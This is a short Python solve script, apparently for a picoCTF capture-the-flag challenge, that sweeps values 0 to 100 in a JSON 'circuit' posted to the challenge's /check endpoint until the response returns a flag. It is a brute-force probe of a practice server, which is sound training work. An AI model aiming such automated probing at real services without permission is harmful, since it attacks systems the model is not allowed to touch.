import requests

URL = "http://activist-birds.picoctf.net:62145/check"
TIMEOUT = 0.5

for n in range(101):
    circuit = [{"input1": n, "input2": n, "output": n}]
    try:
        r = requests.post(URL, json={"circuit": circuit}, timeout=TIMEOUT)
        if r.status_code == 200:
            data = r.json()
            flag = data.get("flag", "")
            if "picoCTF{" in flag:
                print(f"[+] FOUND FLAG at ({n}, {n}, {n})")
                print(flag)
                break
            else:
                print(f"[-] ({n},{n},{n}) -> no flag")
        else:
            print(f"[!] HTTP {r.status_code} on ({n},{n},{n})")
    except Exception as e:
        print(f"[!] Error on ({n},{n},{n}): {e}")
1
